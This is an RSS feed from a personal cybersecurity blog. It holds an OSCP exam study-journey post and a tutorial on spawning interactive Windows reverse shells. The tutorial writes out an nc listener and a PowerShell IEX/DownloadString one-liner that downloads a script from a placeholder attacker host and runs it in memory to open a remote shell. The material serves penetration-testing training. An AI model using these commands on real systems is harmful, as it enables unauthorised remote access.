<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Grant Trowbridge&apos;s Blog</title>
    <description>Cybersecurity blog covering security-related topics, CTFs, and signals
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 10 Dec 2025 20:47:37 -0500</pubDate>
    <lastBuildDate>Wed, 10 Dec 2025 20:47:37 -0500</lastBuildDate>
    <generator>Jekyll v3.9.4</generator>
    
      <item>
        <title>Journey to OSCP</title>
        <description>&lt;p&gt;Having recently passed my Offensive Security Certified Professional exam, I wanted to give back to the OffSec community and share my three year journey towards OSCP. You heard that right. Not only &lt;em&gt;three&lt;/em&gt; years, but passing on my &lt;em&gt;fourth&lt;/em&gt; attempt as well. It hurts the ego to say that out loud, but I feel it is important to be fully transparent, especially for those out there considering beginning your own journey, or perhaps feel like giving up.&lt;/p&gt;

&lt;h1&gt;In the Beninging&lt;/h1&gt;

&lt;p&gt;I first heard of the OSCP exam during a Cyber Security club presentation in college from the one and only &lt;a href=&quot;https://www.linkedin.com/in/connor-mcgarr-7522a6152/&quot;&gt;Connor McGarr&lt;/a&gt;. After watching his buffer overflow demonstration, and learning of the OSCP exam&amp;#39;s difficulty, I knew I was hooked. At this time, I was still a fairly green Cyber Security student and didn&amp;#39;t consider preparation or further investigation until a year later.&lt;/p&gt;

&lt;h2&gt;Exploring Offensive Security&lt;/h2&gt;

&lt;p&gt;My first dive into the topic began in my sophomore year of college with the free &lt;a href=&quot;https://www.youtube.com/playlist?list=PLLKT__MCUeixqHJ1TRqrHsEd6_EdEvo47&quot;&gt;Practical Ethical Hacking Course&lt;/a&gt; YouTube playlist offered by Heath Adams. The course has been updated in recent years, but even back then I felt it was a great primer of the different stages of penetration testing, and appropriate tools to be used for each stage. Even at the end of the course, I still felt out of my depth and didn&amp;#39;t attempt any CTF boxes at the time. My note taking methodology needed &lt;strong&gt;a lot&lt;/strong&gt; of work, I wasn&amp;#39;t seriously considering OSCP down the road. In reality, I remained a casual observer. This would change drastically my senior year of college.&lt;/p&gt;

&lt;h2&gt;Purchasing PEN-200&lt;/h2&gt;

&lt;p&gt;Halfway through my senior year in 2021, I decided to take my career seriously and push myself to learn more about offensive security. I figured if I could pass my OSCP after graduation, it would set me up for a job. This turned out to be true, but not in the way I thought it would. I picked up my coursework during OffSec&amp;#39;s end of the year sale for a slight discount and began taking notes as fast as I was able to. At this time, I modeled my notes after the chapter structure in the PDF itself. Remember when I said my note taking methodology needed work? This is going to be a common theme throughout this post.&lt;/p&gt;

&lt;p&gt;I recall completing the PDF entirely about one month before graduation and spent the rest of my time practicing in the labs and revisiting extra mile challenges from the PDF. The exam purchase only included 90 days of lab access which left me rushing to prepare as much as I could, essentially grasping for straws. I scheduled my exam for June of 2022 and nearly prepared every day leading up to my exam.&lt;/p&gt;

&lt;h3&gt;Attempt #1&lt;/h3&gt;

&lt;p&gt;Since I had no idea what to expect, I spent the entire night staring at the ceiling with my mind racing. I considered all possibilities and imagined every topic I felt underprepared for appearing on the exam. What if HTTP is blocked on a machine and I have to transfer files another way? What if I have to exploit blind SQLi? etc, etc. Needless to say I was wound tight. After grabbing breakfast, I connected to the exam VPN, followed all prerequisite steps, and was off to the races. I decided to focus on Active Directory first, which at the time did not have assumed breach credentials. I actually managed to gain an initial foothold, and then escalated privileges to spawn a system shell on the Windows target! I don&amp;#39;t recall how long this took, but I can assure you it wasn&amp;#39;t impressive. I went back through my notes and saw the next step was to dump credentials. I transferred the necessary tools to the target, dumped hashes, but I wasn&amp;#39;t able to find credentials that could provide access to the next machine in the AD network. What was I missing??&lt;/p&gt;

&lt;p&gt;I spent the rest of the exam toiling on the Windows machine, retracing my steps and looking for something, &lt;em&gt;anything&lt;/em&gt; that may provide access to the next AD machine. I would occassionally review my &lt;code&gt;nmap&lt;/code&gt; output from the other exam machines, did some basic enumeration, but never found any initial access. I felt defeated, and figured it was time to lay down and get some sleep.&lt;/p&gt;

&lt;p&gt;I woke up around 5AM to revisit the machines for one last ditch effort, but it was futile. I knew this attempt was a fail. I decided to not waste time on drafting a PDF report, and laid down to catch up on some sleep.&lt;/p&gt;

&lt;h4&gt;The Silver Lining&lt;/h4&gt;

&lt;p&gt;Let&amp;#39;s fast forward to 2023 for a moment. Remember how I thought this certification would help set me up for a job? It did, but more specifically the &lt;em&gt;failure&lt;/em&gt; set me up for my current job! Believe it or not, I was hired on to &lt;a href=&quot;https://www.scires.com/&quot;&gt;Scientific Research Corporation&lt;/a&gt; roughly one month after my first OSCP attempt. I didn&amp;#39;t discover this until a year and a half in when I decided to ask my boss:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Why &lt;em&gt;did&lt;/em&gt; you hire me?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I was aware that my situation was unusual. It is rather uncommon for a new graduate with no prior DoD experience to be working Cyber Security right out of the gate. I can&amp;#39;t remember what he said word for word, but I clearly remember him mentioning my OSCP exam attempt as something that separated me from the rest of the candidates. To his credit as well, he wanted to give a fresh graduate a chance in Cyber Security, which I am eternally grateful for. The lesson for the reader: &lt;/p&gt;

&lt;p&gt;Your efforts, even in failure, do not go unnoticed. Take that leap of faith!&lt;/p&gt;

&lt;h2&gt;Defense by Day, Offense by Night&lt;/h2&gt;

&lt;p&gt;At this point, I began working full time at SRC starting on July 11th, 2022. OSCP was still in the back of my mind, but my full attention was now on learning the ins and outs of my new job. I knew I wasn&amp;#39;t ready to give up, so I saved over a few months to purchase my PEN-200 Learn One subscription on December 28th, 2022.&lt;/p&gt;

&lt;p&gt;Starting off the New Year in 2023, I dove right back into the PDF course work. At this point, I knew what areas I needed to focus on. I understood the general concepts, but now was the time to get into the knitty gritty details of topics like web app enumeration, Windows and Linux privilege escalation methods, pivoting, etc. I also knew I had to be more organized, so I attempted to create my own cheat sheets in Google Docs, each covering the topics I felt I needed the most help with. In no particular order:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Active Directory&lt;/li&gt;
&lt;li&gt;Client Side Attacks&lt;/li&gt;
&lt;li&gt;Common Web Application Attacks&lt;/li&gt;
&lt;li&gt;Information Gathering (General Enumeration &amp;amp; Scanning)&lt;/li&gt;
&lt;li&gt;Introduction to Web Application Attacks (Noticing a pattern yet?)&lt;/li&gt;
&lt;li&gt;Pivoting&lt;/li&gt;
&lt;li&gt;Privilege Escalation (Windows &amp;amp; Linux Combined)&lt;/li&gt;
&lt;li&gt;SQL Injection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The formatting was basic. Create a descriptive header (and subheaders when necessary) where the body of the section contained a brief explanation of a command/concept, then display the example command directly below in bold font:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;This is a concept to help understand the following commands. This is why you should care:
my-concept-diagram

This is a description about a command. The command does this. It is useful for blah blah blah:
my-command
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It&amp;#39;s not the worst format, but it certainly could&amp;#39;ve been improved upon. This obvious fact reared it&amp;#39;s ugly head during my Learn One lab practice. I&amp;#39;d like to say that this is where things started to turn around for me, but it was rare occurence for me to complete a lab machine on my own. I found myself having to rely on hints and assistance more often than not, but I was still picking up nuggets of information and realizing the gaps in my initial and post-exploit enumeration. It was also around this halfway point in 2023 that I began to learn about Markdown&amp;#39;s intuitive note taking advantages and incorporated &lt;a href=&quot;https://obsidian.md/&quot;&gt;Obsidian&lt;/a&gt; into my daily CTF/pentesting workflow. In spite of this, my notes still lacked an overarching structure that made sense. Looking back through my CTF notes from the challenge labs during this time I can see the frustration. Solutions seem to appear out of thin air, and I can&amp;#39;t see my thought process play out on the page because I relied on those hints. It was a vicious cycle of laziness and burn out. I would bang my head against the proverbial wall for hours (sometimes days), ask for a solution, and record it in my lab notes. The problem? Those solutions never made it to those cheat sheets.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;A man reaps what he sows.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Galatians 6:7 NIV&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3&gt;Attempt #2 (and #3)&lt;/h3&gt;

&lt;p&gt;With a solid year of practice in the OffSec labs, my confidence and proficiency with portions of the pentest cycle began to increase and I was sleeping just fine prior to my second attempt on October 1st, 2023. I knew the drill. Connect to the VPN and proctoring service, complete the exam prerequisites and begin enumerating as fast as I could type. Unfortunately, this attempt was a bust. I wasn&amp;#39;t able to establish a foothold on any Windows system. The 40 points from AD was already off the table. It took about 9 hours for me to eventually hone in on one standalone Linux machine which I successfully rooted. It was a short lived moment of glee as I began to relive the same experience from my first attempt. Toiling in my &lt;code&gt;nmap&lt;/code&gt; and &lt;code&gt;gobuster&lt;/code&gt; scans, revisiting previously enumerated services on a hope and prayer. Nothing came of it, it was clear my enumeration skills were not going to cut it. Somewhere around midnight I ran out of gas and called it. I slept through most the exam time, waking up with an hour and half left to attempt a few more hail marys, but I knew it was a fail. 20/100.&lt;/p&gt;

&lt;p&gt;I did submit my report in spite of failing to ensure I had documented my captured flags and exploitation properly. It also taught me the value of Obsidian&amp;#39;s PDF conversion feature and how it made converting my markdown notes into a PDF report an absolute &lt;em&gt;breeze&lt;/em&gt; ðŸ‘Œ.&lt;/p&gt;

&lt;p&gt;Having purchased a Learn One subscription, I still had one more exam attempt to use. I scheduled the third attempt for December 1st, 2023. I took that two month gap to revisit the OffSec mock OSCP exam sets, as well as starting on some of the AD sets that I hadn&amp;#39;t reached yet. I was at my wits end and didn&amp;#39;t record any additional notes or commands for my cheat sheets. Looking back, I think it was good to keep my methodology fresh in my mind, though I probably could have benefited from taking a week off prior to the exam. I&amp;#39;ll keep another long story short. The outcome was &lt;strong&gt;identical&lt;/strong&gt; to my previous attempt. I was only able to root one Linux machine.&lt;/p&gt;

&lt;p&gt;PDF generated. Submitted. 20/100.&lt;/p&gt;

&lt;h1&gt;A Hiatus and a New Objective&lt;/h1&gt;

&lt;p&gt;At this point I was beyond frustrated with myself and the OSCP exam. I needed a break. I decided to take a good few months off, and during that time I learned of TCM Security&amp;#39;s &lt;a href=&quot;https://certifications.tcm-sec.com/pjpt/&quot;&gt;Practical Junior Penetration Tester (PJPT)&lt;/a&gt; certification. I felt that taking a step back and considering a less intense exam would get some wind in my sails for the next attempt. I kept my eye on this certification as I refocused on work and tried not to dwell on those back-to-back failures.&lt;/p&gt;

&lt;p&gt;After a hefty break, I decided to pull the trigger on the PJPT coursework on July 22nd, 2024 for $199 during a sale. I cannot recommend PJPT enough. Having gone through the OSCP coursework multiple times, I was blown away by the level of quality TCM Security delivered at this price point.  I can confidently say that you will be thoroughly overprepared for your PJPT exam. I certainly picked up a few new tricks from their web application sections! As I progressed through the coursework, my note taking methodology improved slightly. While still resembling the previously discussed &amp;quot;format&amp;quot;, I began to take cheatsheet mindset more seriously. My explanations were consise, and I made the conscious decision to recognize the difference between substance and fluff.&lt;/p&gt;

&lt;p&gt;Fast forwarding to mid November (I can&amp;#39;t recall the exact date), I sat down for the exam and truly felt confident for the first time. I&amp;#39;ll keep this section short for brevity sake, the exam went much better than expected. I ended up completing all objectives at a reasonable time by the evening. I decided to use all two days to retrace all of my steps and ensure that my report was bullet proof, and it was! I was issued my official PJPT certification on November 17th, 2024. This certification was a nice boost for morale, but I knew this was a (valuable) stepping stone towards my ultimate goal of OSCP.&lt;/p&gt;

&lt;h2&gt;The Proving Grounds&lt;/h2&gt;

&lt;p&gt;I allowed myself some time to focus on other topics I wanted to learn. I dabbled in some C# YouTube courses to try and understand the brushes with DotNET I experienced while using PowerShell at work. I began to learn about the Windows API and things quickly became complicating and frustrating. I later learned that it is better to approach the API through C before attempting unmanaged function declaration and marshaling. I was hesitant to invest more time into C, and knew OSCP remained in the back of my mind. This time around I wanted things to be different. Coursework wasn&amp;#39;t going to save me, I needed repetition. I had previously heard of &lt;a href=&quot;https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview&quot;&gt;TJ Null&amp;#39;s Proving Grounds List&lt;/a&gt; after my first OSCP attempt but I was just too eager to jump back into the PEN-200 labs and didn&amp;#39;t consider it seriously. I recognized this thinking was a grave mistake, and purchased my Proving Grounds access on February 20th 2025.&lt;/p&gt;

&lt;h3&gt;Effective Note Taking&lt;/h3&gt;

&lt;p&gt;At this point I knew my lack of organization would ruin my next attempt if I didn&amp;#39;t find a system that worked for me. I began researching different methods for OSCP and found this &lt;a href=&quot;https://medium.com/@0xP/oscp-2022-tips-to-help-you-pass-dddd3563967e&quot;&gt;Medium&lt;/a&gt; blog written by 0xP. In his article, he references someone by the name of Rowbot who had written a CherryTree note template. I translated those sections into markdown format for use in Obsidian and I felt much more deliberate and organized during my Proving Grounds lab practice. Overtime, I decided to incorporate two additional concepts. The first is something I picked up in the defense contracting world called &lt;strong&gt;Lessons Learned&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The term Lessons Learned is broadly used to describe people, things, and activities related to the act of learning from experience to achieve improvements. The idea of Lessons Learned in an organization is that, through a formal approach to learning (i.e. a Lessons Learned procedure), individuals and the organization can reduce the risk of encountering the same problems and increase the chance that successes are repeated.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;NATO Lessons Learned Handbook, Fourth edition, June 2022&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;The idea is to have a section at the very end of your pen testing note template for listing your weakpoints or knowledge gaps, anything that prevented you from solving a box on your own. If there was a chain of events that led up to this misunderstanding, write down every single moment and what your thought process was. If you lay it out on paper, you&amp;#39;re much more likely to identify your mistake and prevent it from happening in the future. If there wasn&amp;#39;t a chain of events, simply note what happened in as many or as few bullet points as you see fit. The markdown format is as follows:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;gh&quot;&gt;# Lessons Learned&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Initial Access&lt;/span&gt;
Order of failures:
&lt;span class=&quot;gu&quot;&gt;## Privilege Escalation&lt;/span&gt;
Order of failures:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is crucial that you go through this mental exercise &lt;strong&gt;IMMEDIATELY&lt;/strong&gt; after rooting a machine while it is fresh in your mind. Yes, your brain is probably fried and yes it may be the last thing you want to do. I promise it is the most important part of a CTF you will complete. Take the time to do it.&lt;/p&gt;

&lt;p&gt;The second concept is referred to as the &lt;strong&gt;Parking Lot&lt;/strong&gt;. Its original application is for meetings, specificially when off-topic questions/discussions arise that aren&amp;#39;t part of the current discussion. They are noted in the &amp;quot;parking lot&amp;quot; so they are not forgotten and can be addressed later. In my offsec methodogoly, it serves as a place to let my conscious flow directly into my notes as I enumerate each discovered port or privilege escalation vector. The entire section should be limited to bullet points for short blurbs about what has been enumerated, what should be done next, and any public exploits that may be applicable. Keep them as concise as possible. If done right, you should be able to read over your parking lot after rooting a machine and see exactly how you discovered initial access and privilege escalation! Here&amp;#39;s an example of what your parking lot should look like:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;gh&quot;&gt;# Parking Lot&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; Port 21 (FTP)
&lt;span class=&quot;p&quot;&gt;    -&lt;/span&gt; Downloaded all files from /public directory
&lt;span class=&quot;p&quot;&gt;    -&lt;/span&gt; No sensitive info contained
&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; Port 80 (HTTP)
&lt;span class=&quot;p&quot;&gt;    -&lt;/span&gt; Found a login.php file
&lt;span class=&quot;p&quot;&gt;        -&lt;/span&gt; Default login default:default was still configured for service
&lt;span class=&quot;p&quot;&gt;            -&lt;/span&gt; Enumerated additional user accounts alice and bob
&lt;span class=&quot;p&quot;&gt;            -&lt;/span&gt; Service 1.0 vulnerable to CVE-XXXX-XXXXX
&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; Privilege Escalation
&lt;span class=&quot;p&quot;&gt;    -&lt;/span&gt; Another bullet
&lt;span class=&quot;p&quot;&gt;    -&lt;/span&gt; More bullets
&lt;span class=&quot;p&quot;&gt;        -&lt;/span&gt; Even sub bullets blah blah you get the idea
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This evolution in my note taking for OSCP was by far the most important for me. I finally felt that my notes were serving me and contributing to my victories in the OffSec labs. Here is my entire Obsidian note template put together. I hope it helps you as much as it helped me ðŸ™‚:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;gh&quot;&gt;# Enumeration&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## TCP&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## UDP&lt;/span&gt;
&lt;span class=&quot;gh&quot;&gt;# Parking Lot&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Web Services&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Other Services&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Potential Service Exploits&lt;/span&gt;
&lt;span class=&quot;gh&quot;&gt;# Exploitation&lt;/span&gt;
&lt;span class=&quot;gh&quot;&gt;# Post-Exploitation&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Host Information&lt;/span&gt;
Hostname:
OS:
Kernel:
Architecture:
&lt;span class=&quot;gu&quot;&gt;## File System&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Running Processes&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Installed Applications&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Users &amp;amp; Groups&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Network&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Scheduled Jobs&lt;/span&gt;
&lt;span class=&quot;gh&quot;&gt;# Privilege Escalation&lt;/span&gt;
&lt;span class=&quot;gh&quot;&gt;# Loot&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Hashes&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Passwords&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Flags&lt;/span&gt;
&lt;span class=&quot;gh&quot;&gt;# Lessons Learned&lt;/span&gt;
&lt;span class=&quot;gu&quot;&gt;## Initial Access&lt;/span&gt;
Order of failures:
&lt;span class=&quot;gu&quot;&gt;## Privilege Escalation&lt;/span&gt;
Order of failures:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Conquering TJ Null&amp;#39;s List&lt;/h3&gt;

&lt;p&gt;30 Linux machines. 15 Windows machines. Roughly seven months of lab access in total spanning from February to September of 2025. Ouch.&lt;/p&gt;

&lt;p&gt;Granted I lost time due to obligations at work, family events, vacation, breaks, all of which are important. Besides that, what else prevented me from completing TJ Null&amp;#39;s list sooner? My ego. I absolutely &lt;strong&gt;HATED&lt;/strong&gt; having to rely on walkthroughs when I was stumped. I felt it was a sign of failure and weakness, I should &lt;em&gt;know&lt;/em&gt; this stuff already. In reality, if I had to turn to a walkthrough for help, it meant I was about to learn something new or be given an opportunity to recognize my knowledge gap in enumeration. I can say this for certain, I rarely learned &lt;em&gt;anything&lt;/em&gt; new from a machine that I was able to complete on my own. Sure it was great for my confidence and validated my skills for that particular scenario, but it did nothing to add to my knowledge base.&lt;/p&gt;

&lt;p&gt;To avoid this pitfall that can drag out your prep time for OSCP, here is my advice. If you find yourself hitting a roadblock on a lab machine, stop what you&amp;#39;re doing and set a timer for at least &lt;strong&gt;one hour&lt;/strong&gt;, and at most &lt;strong&gt;one day&lt;/strong&gt;. Not a second more. If you can&amp;#39;t figure it out within that time frame, swallow your pride and look up the walkthrough. There is nothing wrong with using the walkthroughs while you are practicing. Remember this:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;You don&amp;#39;t know what you don&amp;#39;t know.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Make sure to head to the Lessons Learned section of your notes and write down what went wrong and &lt;em&gt;why&lt;/em&gt;. So long as you write down what happened, and maybe add some new commands to your cheat sheets (more on that later), there is nothing to worry about. Keep moving forward.&lt;/p&gt;

&lt;h3&gt;Obsidian Cheat Sheets for Fun and for Profit ðŸ“ˆ&lt;/h3&gt;

&lt;h2&gt;Returning to the OffSec Labs&lt;/h2&gt;

&lt;p&gt;With the Proving Grounds list &lt;em&gt;finally&lt;/em&gt; completed, the only thing I felt was left to practice was Active Directory and pivoting. So I purchased my one month PEN-200 lab extension on October 9th, 2025. My plan was to complete the OSCP A, B, and C mock exam sets. At this point in my journey I had put in so many CTF reps in the Proving Grounds that things were finally starting to click. With &lt;a href=&quot;https://github.com/nicocha30/ligolo-ng&quot;&gt;Ligolo-NG&lt;/a&gt;, pivoting was an absolute breeze. I was tearing through the AD domains, and I only ever asked for a hint on one set! With the extra time, I went ahead and completed all standalone machines for all three sets. I even gave the Poseiden AD set a shot, but I ran out of time. November 8th, 2025 marked the last day of hands on practice for OSCP. I decided to take that final week off and didn&amp;#39;t allow myself preparation of any kind (besides a strategic purchase of Red Bull). This really helped me reset my stress levels before my exam attempt on November 14th, 2025.&lt;/p&gt;

&lt;h1&gt;The 4th and Final Attempt&lt;/h1&gt;
</description>
        <pubDate>Mon, 24 Nov 2025 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/2025/Journey-to-OSCP/</link>
        <guid isPermaLink="true">http://localhost:4000/2025/Journey-to-OSCP/</guid>
        
        
      </item>
    
      <item>
        <title>When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell</title>
        <description>&lt;p&gt;Picture this. You&amp;#39;re in a good workflow on a Windows target, you even added line editing and command history with &lt;code&gt;rlwrap&lt;/code&gt;. Then it happens, you accidentally start a program in the foreground... Instinctively, you press &lt;code&gt;Ctrl + C&lt;/code&gt; in your &lt;code&gt;nc&lt;/code&gt; Windows shell, killing your shell access along with the program. Not ideal, and very frustrating.&lt;/p&gt;

&lt;p&gt;Enter &lt;a href=&quot;https://github.com/antonioCoco/ConPtyShell&quot;&gt;Invoke-ConPtyShell.ps1&lt;/a&gt;, a fully interactive reverse shell for Windows. Gone are the days of accidental shell deaths. All you&amp;#39;ll need is an HTTP server, &lt;code&gt;nc&lt;/code&gt; listener, and a good attitude :)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; &lt;code&gt;Invoke-ConPtyShell.ps1&lt;/code&gt; utilizes the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/console/createpseudoconsole&quot;&gt;CreatePseudoConsole&lt;/a&gt; function, which is only available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763). If this function is &lt;em&gt;not&lt;/em&gt; available on the target, you will receive a normal &lt;code&gt;nc&lt;/code&gt; shell.&lt;/p&gt;

&lt;h1&gt;Staging the Script &amp;amp; Listener&lt;/h1&gt;

&lt;p&gt;Navigate to the above linked GitHub repository and download the &lt;code&gt;Invoke-ConPtyShell.ps1&lt;/code&gt; PowerShell script onto your attack machine.&lt;/p&gt;

&lt;p&gt;Host the file on your attack machine with &lt;code&gt;python3 -m http.server 80&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/MyTools/ConPtyShell]
â””â”€$ ls   
Invoke-ConPtyShell.ps1

â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/MyTools/ConPtyShell]
â””â”€$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Setup your reverse shell listener on your attack machine with &lt;code&gt;stty raw -echo; (stty size; cat) | nc -lvnp &amp;lt;ATTACK-PORT&amp;gt;&lt;/code&gt;, where &lt;code&gt;&amp;lt;ATTACK-PORT&amp;gt;&lt;/code&gt; is your listener port of choice.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/MyTools/ConPtyShell]
â””â”€$ stty raw -echo; (stty size; cat) | nc -lvnp 443
listening on [any] 443 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h1&gt;Breaking Down the Command&lt;/h1&gt;

&lt;p&gt;You may have noticed that my PowerShell download command is slightly different from the &lt;code&gt;README.md&lt;/code&gt; example, but both achieve the same end goal of downloading and executing the PowerShell script &lt;em&gt;without&lt;/em&gt; saving it to disk.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;IEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://&amp;lt;ATTACK-IP&amp;gt;/Invoke-ConPtyShell.ps1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-ConPtyShell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ATTACK-IP&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ATTACK-PORT&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Rows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ROWS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Cols&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;COLS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Invoke-Expression (IEX)&lt;/code&gt;: Evaluate/run a specified string as a command and returns the results of the expression/command. This allows you to save the script directly in memory.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;New-Object&lt;/code&gt;: Create an instance of a Microsoft .NET Framework or COM object (System.Net.WebClient in this case).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.DownloadString()&lt;/code&gt;: Downloads the requested resource (Invoke-ConPtyShell.ps1) as a string.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Invoke-ConPtyShell&lt;/code&gt;: Executing the ConPtyShell script now in memory.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1&gt;Encoding the Command&lt;/h1&gt;

&lt;p&gt;Before preceding any further, take note of your attack machine&amp;#39;s terminal size with &lt;code&gt;stty size&lt;/code&gt;. This will output the number of rows and columns, respectively. It is important to configure the terminal size correctly or you may inadvertently cut off valuable output in your shell.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/MyTools/ConPtyShell]
â””â”€$ stty size                                      
52 236
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Attempting to use &lt;code&gt;echo&lt;/code&gt; and piping the output to &lt;code&gt;base64&lt;/code&gt; on Linux does not result in a properly encoded command. &lt;code&gt;echo&lt;/code&gt; outputs text in &lt;code&gt;UTF-8&lt;/code&gt; encoding by default, whereas PowerShell is expecting &lt;code&gt;UTF-16LE&lt;/code&gt; (little endian). This is where the following Python script comes into play.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
